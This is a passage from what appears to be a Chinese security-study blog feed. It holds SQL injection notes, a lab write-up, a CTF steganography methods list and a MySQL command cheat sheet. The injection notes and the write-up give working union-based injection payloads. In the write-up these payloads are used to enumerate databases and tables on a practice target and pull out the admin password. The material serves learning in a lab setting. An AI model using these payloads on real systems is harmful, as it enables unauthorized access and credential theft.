把用户输入当做代码执行；</p><p>2、 sql注入的条件？</p><p>　　用户可以控制输入和程序原本要执行代码，拼接用户输入的数据且当作SQL语句去执行；</p><p>3、 order by的作用及含义？</p><p>　　order by的原理是对字段进行一个排序，比如，order by 1就是对一个字段进行排序，如果一共四个字段，你order by 5 数据库不知道怎么排序，于是乎就错误了无返回值；</p><p>　　而在注入中，order by 用于判断显示位；</p><p>4、 union select如何发挥作用？</p><p>　　union为联合查询，a联合b进行了查询，为查询了前面的sql语句(原有的)后再进行后面的sq查询(我们添加的)，但两张表联合查询的字段数必须相同；</p><p>5、 输出位是什么？</p><p>　　SQL查询出来的数据不一定全部会输出，页面上只会输出几个字段的信息，那几个会输出的字段就是输出位；</p><p>6、 information_schema是什么？</p><p>　　information_schema是mysql的系统自带表，用于查询数据，在mysql5.0以上版本中存在；</p><p>7、 加单引号和加 and 1=2有什么区别？</p><p>　　有区别，单引号是为了闭合语句，而and 1=2是为了让union前面的语句无查询结果无输出，然后直接输出拼接进去union后面的那个语句的查询结果；</p><p>8、 and 是什么意思？</p><p>　　and 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是and连接整个语句返回的是False；</p><p>9、 or是什么意思？</p><p>　　or 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是or连接整个语句返回的是True；</p><p>10、and 和 or 选择使用有什么讲究？</p><p>  and 语句执行时，如果and 前的语句返回False,那么and后面的语句根本不执行；</p><p>11、除了单引号外还有其他的符号可以闭合吗？</p><p>　　实际上还是要看源码，常见的是单引号和双引号还有括号；</p><p>12、limit的作用？</p><p>　　limit 在注入中用于排序然后输出，limit a,b中 [a代表了从哪个位置(从0开始) b代表从那位开始显示几条数据]；</p><p>13、可以查讯多个字段内容吗？</p><p>　　可以，可以使用语句Group_concat()函数进行输出；</p><p>14、%23有什么作用？</p><p>　　%23编码为#,用于注释后面的语句,防止SQL注入点后原本的SQL语句对SQL注入进行干扰[#注释是Mysql数据库特有的]；</p><p>15、报错注入的原理？</p><p>　　利用sql注入拼接sql语句，将报错信息输出时同时将我们想要的信息输出；</p><p>16、闭合是什么？</p><p>　　在sql查询中，代码比较严谨，括号和引号都得成双成对，引号内的默认是字符串不会当作SQL语句执行，所以必须闭合然后才能注入，当然有些SQL语句直接拼接，也就不用什么闭合了；</p><p>17、SQL注入有数据库限制吗？</p><p>　　没有，常见的数据库都可以；</p><p>18、SQL注入有动态脚本语言限制吗？</p><p>　　没有限制；</p><p>19、SQL注入如果没系统自带表怎么办？</p><p>　　只能通过猜，不断的尝试，一般而言数据库的表也不会乱起名字，毕竟是团队协作的东西，可以使用到一个exists()函数；</p><p>20、系统自带库管理员不会修改吗？</p><p>　　一般而言并不会；</p><p>21、union all 和 union 区别？</p><p>　　如果输出的数据有相同的，union只会输出一次，而union all都会输出；</p><p>22、为什么用and 1=1正常 and 1=2报错来判断是否存在SQL注入？</p><p>　　因为如果存在SQL注入，那么and就是和的意思，1=1是一个恒等式，然后因为原本能够查出数据，那么两个真就是True，但是1=2肯定是不可能的，这里就会返回一个False,然后因为和必须两个真才返回</p><p>　　True,所以这里拼接就不成立返回False。</p><h2 id="注入之联合查询的基本流程（Mysql数据库）。"><a href="#注入之联合查询的基本流程（Mysql数据库）。" class="headerlink" title="注入之联合查询的基本流程（Mysql数据库）。"></a>注入之联合查询的基本流程（Mysql数据库）。</h2><h4 id="1-显错判断注入点。"><a href="#1-显错判断注入点。" class="headerlink" title="1. 显错判断注入点。"></a>1. 显错判断注入点。</h4><p>　　·使用and 1=1 页面正常。and 1=2 页面不正常。</p><p>　　·使用引号（’或”）,报错就说明存在注入。</p><p>　　·尝试在语句末尾加注释，如果页面不变可能存在注入（不太准确）。</p><p>　　　　例如：遇到url栏中输入’报错，可是sql语句不执行的情况下，可能是有id=’1’的限制。这时，可以这样输入id=1’#或id=1’–+(在#和–+前就可以执行sql语句了)</p><p>　　·注：#如果被吞，可以该成 %23。</p><p>　　·注：#注释是mysql数据库特有的。</p><p>　　·注：–+注释大部分常见的数据库都有。</p><p>　　·如果是数字型传参，可以尝试参数+1或-1 （例如id=1+1 或id=1-1）因为在SQL语句中时可以执行运算的。比较好用的是 -1，因为+有时候会当成空格执行。</p><p>　　　　例如：</p><p>　　　　<a href="http://www.xxx.com/new.php?id=1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=1</a>  页面显示id=1的新闻</p><p>　　　　<a href="http://www.xxx.com/new.php?id=2-1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=2-1</a> 页面显示id=1的新闻</p><p>　　　　and 1=1 and 1=2 被拦截的可能性太高了</p><p>　　　　可以尝试 and -1=-1 and -1=-2</p><p>　　·或者直接 or sleep(5)，如果页面转圈圈了，就存在SQL注入。</p><h4 id="2-判断当前页面字段总数。"><a href="#2-判断当前页面字段总数。" class="headerlink" title="2. 判断当前页面字段总数。"></a>2. 判断当前页面字段总数。</h4><p>　　·判断字段数的原因：是为了使用联合查询，因为在union 内部的 select 语句必须拥有相同数量的列。</p><p>　　·语句为：order by语句用于根据指定的列对结果集进行排序。</p><p>　　　　　　 order by 语句默认按照升序对记录进行排序。</p><p>　　·order by x(x从1开始)</p><p>　　　　例如：如果 order by 3 页面不正常，说明数据库只有2个字段。</p><h4 id="3-判断显示位。"><a href="#3-判断显示位。" class="headerlink" title="3. 判断显示位。"></a>3. 判断显示位。</h4><p>　　·需要判断显示位的原因：因为页面的内容都是选择性输出的，所以要用到该语句。</p><p>　　　　比如有两个字段，第一个字段是id，第二个字段是网页的内容，用这个语句就是为了找到显示这个网页内容的字段。</p><p>　　·例如：页面只会显示页面数据的字段内容，不会显示id字段的内容。所以，要找到哪个地方能够输出。</p><p>　　·语句为：id=9.9 union select 1,2,3……（有多少个字段，就到几）</p><h4 id="4-查看当前的数据库。"><a href="#4-查看当前的数据库。" class="headerlink" title="4. 查看当前的数据库。"></a>4. 查看当前的数据库。</h4><p>　　·语句为：id=9.9 union select 1,2,x,database()</p><p>　　·参数必定要为假或使用and 1=2，显示位的数字改为database()。</p><h4 id="5-查表名。"><a href="#5-查表名。" class="headerlink" title="5. 查表名。"></a>5. 查表名。</h4><p>　　·在mysql数据库中(.)是选中的意思。</p><p>　　　　例如语句为：information_schema.tables.a</p><p>　　　　则意思为：在information_schema数据库中选择tables表的a 字段。</p><p>　　·语句为：id=9.9 union select 1,2,table_name from information_schema.tables where table_schema = database() limit x,1</p><p>　　　　或id=9.9 union select 1,2,table_name from information_schema.tables wheretable_schema =’数据库名’ limit x,1</p><p>　　·注：x,用于判断还有没有其它的表，从0开始。</p><h4 id="6-查列名。"><a href="#6-查列名。" class="headerlink" title="6. 查列名。"></a>6. 查列名。</h4><p>　　·语句为：id=9.9 union select 1,2,3,column_name,5,6,7,8,9,10 from information_schema.columns where table_name = ‘表名’ limit x,1</p><p>　　·或id=9.9 union select 1,2,3,group_concat(column_name),5,6,7,8,9,10 from information_schema.columns where table_name = ‘表名’ limit x,1</p><h4 id="7-查字段内容。"><a href="#7-查字段内容。" class="headerlink" title="7. 查字段内容。"></a>7. 查字段内容。</h4><p>　　·语句为：id=9.9 union select 1,用户名段(密码段) from 表名 limit 0,1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入之显错注入&quot;&gt;&lt;a href=&quot;#SQL注入之显错注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入之显错注入&quot;&gt;&lt;/a&gt;SQL注入之显错注入&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;注入本质？&quot;&gt;&lt;a href=&quot;#注入本
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sql注入练习笔记</title>
    <link href="http://yoursite.com/2020/10/21/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/21/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-21T08:09:29.976Z</published>
    <updated>2020-10-22T08:57:05.682Z</updated>
    
    <content type="html"><![CDATA[<p>封神台一道sql注入题</p><p><img src="http://cdn.sijiu.ren/blog/20201021/pSyMidViQd9d.png?imageslim" alt></p><p><a href="http://59.63.200.79:8003/?id=1" target="_blank" rel="noopener">传送门</a></p><p><img src="http://cdn.sijiu.ren/blog/20201021/eeyRyLVfeMkn.png?imageslim" alt></p><p>判断注入点</p><pre><code>id=1&#39;</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/dW75VnyJEp42.png?imageslim" alt></p><p>页面回显异常说明参数带入数据库查询</p><p>输入</p><pre><code>id=1 and 1=1</code></pre><p>页面回显正常</p><p>输入</p><pre><code>id=1 and 1=2</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/uSR4dBbOzBj3.png?imageslim" alt></p><p>页面回显错误</p><p>判断此页面存在注入点</p><p>判断字段数</p><pre><code>id=1 order by 1  回显正常id=1 order by 2  回显正常id=1 order by 3  回显异常</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/5rgYSREdukSE.png?imageslim" alt></p><p>此网页字段数为2</p><p>查询当前数据库的名称</p><pre><code>id = 1 and 1=2 union select 1,database()</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/XBPEp5eUNrA6.png?imageslim" alt></p><p>查询版本号</p><pre><code>id=1 and 1=2 union select 1,version()</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/ssarA2lEYh8S.png?imageslim" alt></p><blockquote><p>Mysql在5.0以上版本加入了 information_schema 这个系统自带库 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等<br> information_schema.tables 存放表名和库名的对应<br> information_schema.columns 存放字段名和表名的对应</p></blockquote><p>查询所有库名</p><pre><code>id=1 and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata</code></pre><blockquote><p>在mysql中，默认information_schema总库，其中包含所有的库名，表名，字段名…<br> schema_name是库名，information_schema.schemata是总库里的所有库。<br> 这段的意思是从information_schema.schemata总库的所有库中列出所有的库名。</p></blockquote><p><img src="http://cdn.sijiu.ren/blog/20201021/Wwc3cv0jcx2d.png?imageslim" alt></p><p>查询到三个数据库：information_schema,maoshe,test  </p><p>查询表</p><pre><code>id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;maoshe&#39;</code></pre><blockquote><p>table_name是表名，information_schema.tables是总库里的所有表。<br> 这段意思是从information_schema.tables总库的所有表中列出在maoshe库里的所有表名。</p></blockquote><p><img src="http://cdn.sijiu.ren/blog/20201021/emiJeOil2abi.png?imageslim" alt></p><p>查询字段名</p><pre><code>id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;maoshe&#39; and table_name=&#39;admin&#39;</code></pre><blockquote><p>column_name是字段名， information_schema.columns 是总库里的所有字段。<br> 这段意思是从information_schema.columns总库里的所有字段中列出在maoshe库里且在admin表里的所有字段名。</p></blockquote><p><img src="http://cdn.sijiu.ren/blog/20201021/A7t3odr4mbm6.png?imageslim" alt></p><p>查询到三个字段名  我们需要获得密码所以查询password字段</p><pre><code>id=1 and 1=2 union select 1,password from admin</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/tPAGVfctuUiS.png?imageslim" alt></p><p>得到管理员密码 hellohack  验证一下</p><p><img src="http://cdn.sijiu.ren/blog/20201021/8NOOgJqTvDW5.png?imageslim" alt></p><p>ps:验证的时候注意不要把空格也复制进去</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;封神台一道sql注入题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://cdn.sijiu.ren/blog/20201021/pSyMidViQd9d.png?imageslim&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://59.63.200.79:8003
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTF隐写解题思路</title>
    <link href="http://yoursite.com/2020/06/20/CTF%E9%9A%90%E5%86%99%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <id>http://yoursite.com/2020/06/20/CTF%E9%9A%90%E5%86%99%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
    <published>2020-06-20T04:28:58.845Z</published>
    <updated>2020-06-20T04:32:54.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01图像隐写术进行数据隐写分为以下几类："><a href="#0x01图像隐写术进行数据隐写分为以下几类：" class="headerlink" title="0x01图像隐写术进行数据隐写分为以下几类："></a>0x01图像隐写术进行数据隐写分为以下几类：</h2><ul><li>1.在图片右击查看属性，在详细信息中隐藏数据</li><li>2.将数据类型进行改写（rar或者zip数据改为jpg等格式）</li><li>3.根据各种类型图像的固定格式，隐藏数据</li><li>在编译器中修改图像开始的标志，改变其原来图像格式</li><li>在图像结束标志后加入数据</li><li>在图像数据中加入数据，不影响视觉效果情况下修改像素数据，加入信息</li><li>4.利用隐写算法将数据隐写到图片中而不影响图像（仅限于jpg图像） 隐写常用的算法有F5，guess jsteg jphide。</li></ul><h2 id="0x02破解隐写术方法及步骤"><a href="#0x02破解隐写术方法及步骤" class="headerlink" title="0x02破解隐写术方法及步骤"></a>0x02破解隐写术方法及步骤</h2><ul><li>1.查看图像属性详细信息是否有隐藏内容</li><li>2.利用winhex或nodepad++打开搜索ctf,CTF，flag,key等关键字是否存在相关信息</li><li>3.检查图像的开头标志和结束标志是否正确，若不正确修改图像标志恢复图像，打开查看是否有flag或ctf信息，（往往gif属于动图，需要分帧查看各帧图像组合所得数据 若不是直接的ctf或flag信息 需要考虑将其解码）</li><li>jpg图像开始标志：FF D8 结束标志 ：FF D9</li><li>gif图像开始标志：47 49 46 38 39 61 (GIF89)结束标志：01 01 00 3B</li><li>bmp图片开始标志：42 4D //92 5B 54 00 00 00 00 00 结束标志：00</li><li>png图片开始标志：89 50 结束标志：60 82</li><li>4.将图片放置在kail系统中，执行binwalk xxx.jpg 查看图片中是否是多个图像组合或者包含其他文件（若存在多幅图像组合，再执行foremost xxx.jpg会自动分离；若检测出其他文件修改其后缀名即可，如zip）</li><li>5.使用StegSolve对图像进行分通道扫描，查看是否为LSB隐写</li><li>6.在kail下切换到F5-steganography，在java Extract运行</li><li>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</li><li>判断是否为F5算法隐写</li><li>7.在kali系统中使用outguess-master工具（需要安装），检测是否为guess算法隐写</li></ul><h2 id="0x03算法隐写的具体操作"><a href="#0x03算法隐写的具体操作" class="headerlink" title="0x03算法隐写的具体操作"></a>0x03算法隐写的具体操作</h2><p>1.F5算法隐写</p><p>具体操作：在kail下切换到F5-steganography，在java Extract运行</p><p>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</p><p>2.LSB算法隐写</p><p>具体操作：在Stegsolve.jar分析data Extract的red blue green</p><p>3.guess算法隐写</p><p>具体操作：在kail下切换到outguess目录下，直接用命令即可</p><p>命令:outguess -r /root/angrybird.jpg(绝对路径) 123.txt(信息存放的文本)</p><h2 id="0x04工具使用"><a href="#0x04工具使用" class="headerlink" title="0x04工具使用"></a>0x04工具使用</h2><h3 id="1-MP3stego"><a href="#1-MP3stego" class="headerlink" title="1.MP3stego"></a>1.MP3stego</h3><pre><code>encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3Decode.exe -X -P pass(密码) svega_stego.mp3(要拷贝到目录下) //解码</code></pre><h3 id="2-stedgetect"><a href="#2-stedgetect" class="headerlink" title="2.stedgetect"></a>2.stedgetect</h3><p>Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br>s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p><p>d – 打印带行号的调试信息。</p><p>t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p><p>j – 检测图像中的信息是否是用jsteg嵌入的。</p><p>o – 检测图像中的信息是否是用outguess嵌入的。</p><p>p – 检测图像中的信息是否是用jphide嵌入的。</p><p>i – 检测图像中的信息是否是用invisible secrets嵌入的。<br>命令：stegdetect.exe -tjopi -s10.0 xxx.jpg</p><h6 id="转载于-https-www-cnblogs-com-chenxs-p-11493898-html"><a href="#转载于-https-www-cnblogs-com-chenxs-p-11493898-html" class="headerlink" title="转载于:https://www.cnblogs.com/-chenxs/p/11493898.html"></a>转载于:<a href="https://www.cnblogs.com/-chenxs/p/11493898.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11493898.html</a></h6>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01图像隐写术进行数据隐写分为以下几类：&quot;&gt;&lt;a href=&quot;#0x01图像隐写术进行数据隐写分为以下几类：&quot; class=&quot;headerlink&quot; title=&quot;0x01图像隐写术进行数据隐写分为以下几类：&quot;&gt;&lt;/a&gt;0x01图像隐写术进行数据隐写分为以下几
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>sql常用命令</title>
    <link href="http://yoursite.com/2020/05/31/sql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2020/05/31/sql%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2020-05-31T08:24:04.115Z</published>
    <updated>2020-09-15T13:58:48.211Z</updated>
    
    <content type="html"><![CDATA[<p>用户管理：</p><p>　　1、新建用户：</p><p>　　　　&gt;CREATE USER name IDENTIFIED BY ‘ssapdrow’;</p><p>　　2、更改密码：</p><p>　　　　&gt;SET PASSWORD FOR name=PASSWORD(‘fdddfd’);</p><p>　　3、权限管理</p><p>　　　　&gt;SHOW GRANTS FOR name;    //查看name用户权限</p><p>　　　　&gt;GRANT SELECT ON db_name.* TO name;　　　　//给name用户db_name数据库的所有权限</p><p>　　　　&gt;REVOKE SELECT ON db_name.* TO name;　　　　//GRANT的反操作，去除权限；</p><p>一、数据库操作：　</p><p>　　1、查看数据库：</p><p>　　　　&gt;SHOW DATABASES;</p><p>　　2、创建数据库：</p><p>　　　　&gt;CREATE DATABASE db_name;　　//db_name为数据库名</p><p>　　3、使用数据库：</p><p>　　　　&gt;USE db_name;</p><p>　　4、删除数据库：</p><p>　　　　&gt;DROP DATABASE db_name;</p><p>二、创建表：</p><p>　　1、创建表：</p><p>　　　　&gt;CREATE TABLE table_name(</p><p>　　　　&gt;id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT,　　　　//id值，无符号、非空、递增——唯一性，可做主键。</p><p>　　　　&gt;name VARCHAR(60) NOT NULL</p><p>　　　　&gt;score TINYINT UNSIGNED NOT NULL DEFAULT 0,　　　　//设置默认列值</p><p>　　　　&gt;PRIMARY KEY(id)</p><p>　　　　&gt;)ENGINE=InnoDB　　　　//设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索</p><p>　　　　&gt;DEFAULT charset=utf8;　　//设置默认的编码，防止数据库中文乱码</p><p>　　　　如果有条件的创建数据表还可以使用   &gt;CREATE TABLE IF NOT EXISTS tb_name(……..</p><p>　　2、复制表：</p><p>　　　　&gt;CREATE TABLE tb_name2 SELECT * FROM tb_name;</p><p>　　　　或者部分复制：</p><p>　　　　&gt;CREATE TABLE tb_name2 SELECT id,name FROM tb_name;</p><p>　　3、创建临时表：</p><p>　　　　&gt;CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样);</p><p>　　4、查看数据库中可用的表：</p><p>　　　　&gt;SHOW TABLES;</p><p>　　5、查看表的结构：</p><p>　　　　&gt;DESCRIBE tb_name;</p><p>　　　　也可以使用：</p><p>　　　　&gt;SHOW COLUMNS in tb_name; 　　　　//from也可以</p><p>　　6、删除表：</p><p>　　　　&gt;DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];</p><p>　　　　实例：</p><p>　　　　&gt;DROP TABLE IF EXISTS tb_name;</p><p>　　7、表重命名：</p><p>　　　　&gt;RENAME TABLE name_old TO name_new;</p><p>　　　　还可以使用：</p><p>　　　　&gt;ALTER TABLE name_old RENAME name_new;</p><p>三、修改表：</p><p>　　1、更改表结构：</p><p>　　　　&gt;ALTER TABLE tb_name ADD[CHANGE,RENAME,DROP] …要更改的内容…</p><p>　　　　实例：</p><p>　　　　&gt;ALTER TABLE tb_name ADD COLUMN address varchar(80) NOT NULL;</p><p>　　　　&gt;ALTER TABLE tb_name DROP address;</p><p>　　　　&gt;ALTER TABLE tb_name CHANGE score score SMALLINT(4) NOT NULL;</p><p>四、插入数据：</p><p>　　1、插入数据：</p><p>　　　　&gt;INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);</p><p>　　　　这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。</p><p>　　2、插入检索出来的数据：</p><p>　　　　&gt;INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2;</p><p>五、更新数据：</p><p>　　1、指定更新数据：</p><p>　　　　&gt;UPDATE tb_name SET score=189 WHERE id=2;</p><p>　　　　&gt;UPDATE tablename SET columnName=NewValue [ WHERE condition ]</p><p>六、删除数据：</p><p>　　1、删除数据：</p><p>　　　　&gt;DELETE FROM tb_name WHERE id=3;</p><p>七、条件控制：</p><p>　　1、WHERE 语句：</p><p>　　　　&gt;SELECT * FROM tb_name WHERE id=3;</p><p>　　2、HAVING 语句：</p><p>　　　　&gt;SELECT * FROM tb_name GROUP BY score HAVING count(*)&gt;2</p><p>　　3、相关条件控制符： </p><p>　　　　=、&gt;、&lt;、&lt;&gt;、IN(1,2,3……)、BETWEEN a AND b、NOT</p><p>　　　　AND 、OR</p><p>　　　　Linke()用法中      %  为匹配任意、  _  匹配一个字符（可以是汉字）</p><p>　　　　IS NULL 空值检测</p><p> 八、MySQL的正则表达式：</p><p>　　1、Mysql支持REGEXP的正则表达式：</p><p>　　　　&gt;SELECT * FROM tb_name WHERE name REGEXP ‘^[A-D]’   //找出以A-D 为开头的name</p><p>　　2、特殊字符需要转义。</p><p> 九、MySQL的一些函数：</p><p>　　1、字符串链接——CONCAT()</p><p>　　　　&gt;SELECT CONCAT(name,’=&gt;’,score) FROM tb_name</p><p>　　2、数学函数：</p><p>　　　　AVG、SUM、MAX、MIN、COUNT；</p><p>　　3、文本处理函数：</p><p>　　　　TRIM、LOCATE、UPPER、LOWER、SUBSTRING</p><p>　　4、运算符：</p><p>　　　　+、-、*、\</p><p>　　5、时间函数：</p><p>　　　　DATE()、CURTIME()、DAY()、YEAR()、NOW()…..</p><p> 十、分组查询：</p><p> 　　1、分组查询可以按照指定的列进行分组：</p><p>　　　　&gt;SELECT COUNT(<em>) FROM tb_name GROUP BY score HAVING COUNT(</em>)&gt;1;</p><p>　　2、条件使用Having；</p><p>　　3、ORDER BY 排序：</p><p>　　　　ORDER BY DESC|ASC　　　　=&gt;按数据的降序和升序排列</p><p>十一、UNION规则——可以执行两个语句（可以去除重复行）</p><p> 十二、全文检索——MATCH和AGAINST</p><p>　　1、SELECT MATCH(note_text)AGAINST(‘PICASO’) FROM tb_name;</p><p>　　2、InnoDB引擎不支持全文检索，MyISAM可以；</p><p> 十三、视图</p><p>　　1、创建视图</p><p>　　　　&gt;CREATE VIEW name AS SELECT * FROM tb_name WHERE <del>~ ORDER BY ~</del>;</p><p>　　2、视图的特殊作用：</p><p>　　　　　　a、简化表之间的联结（把联结写在select中）；</p><p>　　　　　　b、重新格式化输出检索的数据（TRIM，CONCAT等函数）；</p><p>　　　　　　c、过滤不想要的数据（select部分）</p><p>　　　　　　d、使用视图计算字段值，如汇总这样的值。</p><p> 十四、使用存储过程：</p><p>　　个人理解，存储过程就是一个自定义函数，有局部变量参数，可传入参数，可以返回值，不过这语法够呆滞的<del>~</del></p><p>　　1、创建存储过程：</p><p>　　　　&gt;CREATE PROCEDURE pro(</p><p>　　　　&gt;IN num INT,OUT total INT)</p><p>　　　　&gt;BEGIN</p><p>　　　　&gt;SELECT SUM(score) INTO total FROM tb_name WHERE id=num;</p><p>　　　　&gt;END;</p><p>　　　***这里的  IN (传递一个值给存储过程)，OUT（从存储过程传出一个值），INOUT（对存储过程传入、传出），INTO（保存变量）</p><p>　　2、调用存储过程：</p><p>　　　　&gt;CALL pro(13,@total)　　　　　　//这里的存储过程两个变量，一个是IN一个是OUT，这里的OUT也是需要写上的，不写会出错</p><p>　　　　&gt;SELECT @total　　　　　　　　　//这里就可以看到结果了；</p><p>　　3、存储过程的其他操作：</p><p>　　　　&gt;SHOW PROCEDURE STATUS;　　　　　　//显示当期的存储过程</p><p>　　　　&gt;DROP PROCEDURE pro;　　　　　　　　　//删除指定存储过程</p><p>十五、使用游标：</p><p>　　对这个理解不是很懂，朋友多多指点哦<del>~</del></p><p>　　　1、游标的操作</p><p>　　　　&gt;CREATE PROCEDURE pro()</p><p>　　　　&gt;BEGIN </p><p>　　　　&gt;DECLARE ordername CURSOR FOR</p><p>　　　　&gt;SELECT order_num FROM orders;</p><p>　　　　&gt;END;</p><p>　　　　</p><p>　　　　&gt;OPEN ordername;　　　　//打开游标</p><p>　　　　&gt;CLOSE ordername;　　　　//关闭游标</p><p>十六、触发器：</p><p>　　触发器是指在进行某项指定操作时，触发触发器内指定的操作；</p><p>　　1、支持触发器的语句有DELETE、INSERT、UPDATE,其他均不支持</p><p>　　2、创建触发器：</p><p>　　　　&gt;CREATE TRIGGER trig AFTER INSERT ON ORDERS FOR EACH ROW SELECT NEW.orser_name;</p><p>　　　　&gt;INSERT语句，触发语句，返回一个值</p><p>　　3、删除触发器</p><p>　　　　&gt;DROP TRIGGER trig;</p><p>十七、语法整理：</p><p>　　1、ALTER TABLE（修改表）</p><p>　　　　ALTER TABLE table_name</p><p>　　　　(　　ADD　　　　column　　datatype  　　[ NULL | NOT NULL ]　　[ CONSTRAINTS ]</p><p>　　　　　　 CHANGE　　column 　　datatype 　　COLUMNS　　[ NULL | NOT NULL ]　　 [ CONSTRAINTS ]</p><p>　　　　　　 DROP　　　 column，</p><p>　　　　　　　。。。。</p><p>　　　　)</p><p>　　2、COMMIT(处理事务)</p><p>　　　　&gt;COMMIT;</p><p> 　　3、CREATE INDEX(在一个或多个列上创建索引)</p><p>　　　　CREATE INDEX index_name ON tb_name (column [ ASC | DESC ] , …….);</p><p> 　　4、CREATE PROCEDURE (创建存储过程)</p><p>　　　　CREATE PROCEDURE pro([ parameters ])</p><p>　　　　BEGIN</p><p>　　　　……..</p><p>　　　　END</p><p> 　　5、CREATE TABLE(创建表)</p><p>　　　　CREATE TABLE tb_name(</p><p>　　　　column_name　　datetype　　[ NULL | NOT NULL ] 　　[ condtraints]   ,</p><p>　　　　column_name　　datetype　　[ NULL | NOT NULL ] 　　[ condtraints]   ,</p><p>　　　　…….</p><p>　　　　PRIMARY KEY( column_name )</p><p>　　　　)ENGINE=[  InnoDB | MyiSAM ]DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;</p><p> 　　6、CREATE USER(创建用户)</p><p>　　　　CREATE USER user_name [ @hostname ] [ IDENTIFIED BY [ PASSWORD ] ‘pass_word’ ];</p><p> 　　7、CREATE VIEW （在一个或多个表上创建视图）</p><p>　　　　CREATE [ OR REPLACE ] VIEW view_name AS SELECT。。。。。。</p><p> 　　8、DELETE (从表中删除一行或多行)</p><p>　　　　DELETE FROM table_name [WHERE ……]</p><p> 　　9、DROP(永久删除数据库及对象，如视图、索引等)</p><p>　　　　DROP DATEBASE | INDEX | PROCEDURE | TABLE | TRIGGER | USER | VIEW  name</p><p> 　　10、INSERT （给表添加行）</p><p>　　　　INSERT INTO tb_name [ ( columns,…… ) ]  VALUES(value1,…………);</p><p>　　　　使用SELECT值插入：</p><p>　　　　INSERT INTO tb_name [ ( columns,…… ) ]</p><p>　　　　SELECT columns , …….   FROM tb_name [ WHERE …… ] ;</p><p>　　 11、ROLLBACK（撤销一个事务处理块）</p><p>　　　　ROLLBACK [  TO  savapointname  ];</p><p>　　 12、SAVEPOINT(为ROLLBACK设置保留点)</p><p>　　　　SAVEPOINT sp1;</p><p>　　 13、SELECT (检索数据，显示信息)</p><p>　　　　SELECT column_name,…..FROM tb_name  [ WHERE ]   [ UNION ]    [ RROUP BY ]   [ HAVING ]   [ ORDER BY ]</p><p> 　　14、START TRANSACTION (一个新的事务处理块的开始)</p><p>　　　　START TRANSACTION</p><p>　　 15、UPDATE(更新一个表中的一行或多行)</p><p>　　　　UPDATE tb_name SET column=value,……[ where ]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;用户管理：&lt;/p&gt;
&lt;p&gt;　　1、新建用户：&lt;/p&gt;
&lt;p&gt;　　　　&amp;gt;CREATE USER name IDENTIFIED BY ‘ssapdrow’;&lt;/p&gt;
&lt;p&gt;　　2、更改密码：&lt;/p&gt;
&lt;p&gt;　　　　&amp;gt;SET PASSWORD FOR name=PA
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTF中Web题目的常见题型及解题姿势</title>
    <link href="http://yoursite.com/2020/04/30/CTF%E4%B8%ADWeb%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E5%8F%8A%E8%A7%A3%E9%A2%98%E5%A7%BF%E5%8A%BF/"/>
